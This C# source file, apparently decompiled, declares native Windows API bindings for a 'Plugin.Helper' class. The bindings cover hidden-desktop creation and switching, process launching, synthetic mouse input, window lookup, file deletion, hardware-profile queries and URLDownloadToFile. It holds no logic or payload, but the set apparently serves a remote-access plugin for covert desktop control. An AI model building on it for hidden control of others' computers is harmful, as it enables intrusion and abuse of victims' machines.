using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Plugin.Helper;

internal class HandelNative
{
	public struct RECT
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;

		public IntPtr hThread;

		public int dwProcessId;

		public int dwThreadId;
	}

	public struct STARTUPINFO
	{
		public int cb;

		public string lpReserved;

		public string lpDesktop;

		public string lpTitle;

		public int dwX;

		public int dwY;

		public int dwXSize;

		public int dwYSize;

		public int dwXCountChars;

		public int dwYCountChars;

		public int dwFillAttribute;

		public int dwFlags;

		public short wShowWindow;

		public short cbReserved2;

		public IntPtr lpReserved2;

		public IntPtr hStdInput;

		public IntPtr hStdOutput;

		public IntPtr hStdError;
	}

	[Flags]
	internal enum DESKTOP_ACCESS : uint
	{
		DESKTOP_NONE = 0u,
		DESKTOP_READOBJECTS = 1u,
		DESKTOP_CREATEWINDOW = 2u,
		DESKTOP_CREATEMENU = 4u,
		DESKTOP_HOOKCONTROL = 8u,
		DESKTOP_JOURNALRECORD = 0x10u,
		DESKTOP_JOURNALPLAYBACK = 0x20u,
		DESKTOP_ENUMERATE = 0x40u,
		DESKTOP_WRITEOBJECTS = 0x80u,
		DESKTOP_SWITCHDESKTOP = 0x100u,
		GENERIC_ALL = 0x1FFu
	}

	[Flags]
	public enum MouseEventFlags : uint
	{
		MOUSEEVENTF_ABSOLUTE = 0x8000u,
		MOUSEEVENTF_LEFTDOWN = 2u,
		MOUSEEVENTF_LEFTUP = 4u,
		MOUSEEVENTF_MIDDLEDOWN = 0x20u,
		MOUSEEVENTF_MIDDLEUP = 0x40u,
		MOUSEEVENTF_MOVE = 1u,
		MOUSEEVENTF_RIGHTDOWN = 8u,
		MOUSEEVENTF_RIGHTUP = 0x10u,
		MOUSEEVENTF_XDOWN = 0x80u,
		MOUSEEVENTF_XUP = 0x100u,
		MOUSEEVENTF_WHEEL = 0x800u,
		MOUSEEVENTF_HWHEEL = 0x1000u
	}

	public enum WindowLongFlags
	{
		GWL_USERDATA = -21,
		GWL_EXSTYLE = -20,
		GWL_STYLE = -16,
		GWL_ID = -12,
		GWLP_HWNDPARENT = -8,
		GWLP_HINSTANCE = -6,
		GWL_WNDPROC = -4,
		DWLP_MSGRESULT = 0,
		DWLP_DLGPROC = 4,
		DWLP_USER = 8
	}

	public delegate bool EnumDesktopProc(string lpszDesktop, IntPtr lParam);

	public static bool Right = false;

	public const int NORMAL_PRIORITY_CLASS = 32;

	public static List<int> m_lstProcessID = new List<int>();

	public const long DESKTOP_CREATEWINDOW = 2L;

	public const long DESKTOP_ENUMERATE = 64L;

	public const long DESKTOP_WRITEOBJECTS = 128L;

	public const long DESKTOP_SWITCHDESKTOP = 256L;

	public const long DESKTOP_CREATEMENU = 4L;

	public const long DESKTOP_HOOKCONTROL = 8L;

	public const long DESKTOP_READOBJECTS = 1L;

	public const long DESKTOP_JOURNALRECORD = 16L;

	public const long DESKTOP_JOURNALPLAYBACK = 32L;

	public const long AccessRights = 511L;

	public const short SWP_NOMOVE = 2;

	public const short SWP_NOSIZE = 1;

	public const short SWP_NOZORDER = 4;

	public const short SWP_SHOWWINDOW = 64;

	private readonly IntPtr HWND_BOTTOM = new IntPtr(1);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern int GetSystemMetrics(int smIndex);

	[DllImport("user32.dll")]
	public static extern IntPtr GetWindowLong(IntPtr hWnd, int nIndex);

	[DllImport("dwmapi.dll", PreserveSig = false)]
	public static extern void DwmEnableComposition(bool bEnable);

	[DllImport("kernel32.dll")]
	public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

	[DllImport("user32.dll")]
	public static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, long dwDesiredAccess, IntPtr lpsa);

	[DllImport("user32.dll")]
	public static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, long dwDesiredAccess);

	[DllImport("user32.dll")]
	public static extern int SetWindowLong(IntPtr hWnd, [MarshalAs(UnmanagedType.I4)] WindowLongFlags nIndex, int dwNewintptr);

	[DllImport("user32.dll")]
	public static extern bool SetThreadDesktop(IntPtr hDesktop);

	[DllImport("user32.dll")]
	public static extern bool CloseDesktop(IntPtr hDesktop);

	[DllImport("user32.dll")]
	public static extern IntPtr GetProcessWindowStation();

	[DllImport("user32.dll")]
	public static extern bool EnumDesktops(IntPtr hwinsta, EnumDesktopProc lpEnumFunc, IntPtr lParam);

	[DllImport("kernel32", CharSet = CharSet.Unicode)]
	public static extern bool DeleteFile(string name);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);

	[DllImport("user32.dll", EntryPoint = "FindWindowEx")]
	public static extern IntPtr FindWindowEx2(IntPtr hWnd1, IntPtr hWnd2, IntPtr lpsz1, string lpsz2);

	[DllImport("advapi32.dll")]
	public static extern bool GetCurrentHwProfile(IntPtr fProfile);

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

	[DllImport("user32.dll", EntryPoint = "GetWindowTextW")]
	public static extern int GetWindowText([In] IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] out StringBuilder lpString, int nMaxCount);

	[DllImport("winmm.dll")]
	public static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);

	[DllImport("user32.dll")]
	public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);

	[DllImport("kernel32.dll")]
	public static extern bool QueryFullProcessImageName([In] IntPtr hProcess, [In] uint dwFlags, out StringBuilder lpExeName, out uint lpdwSize);

	[DllImport("user32.dll", CharSet = CharSet.Ansi)]
	public static extern IntPtr SendMessage(IntPtr hWnd, int hMsg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("kernel32.dll", EntryPoint = "Sleep")]
	public static extern void SleepThread(int ms);

	[DllImport("urlmon.dll", CharSet = CharSet.Auto)]
	public static extern int URLDownloadToFile([MarshalAs(UnmanagedType.IUnknown)] object pCaller, [MarshalAs(UnmanagedType.LPWStr)] string szURL, [MarshalAs(UnmanagedType.LPWStr)] string szFileName, int dwReserved, IntPtr lpfnCB);

	[DllImport("user32.dll")]
	public static extern IntPtr SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);
}
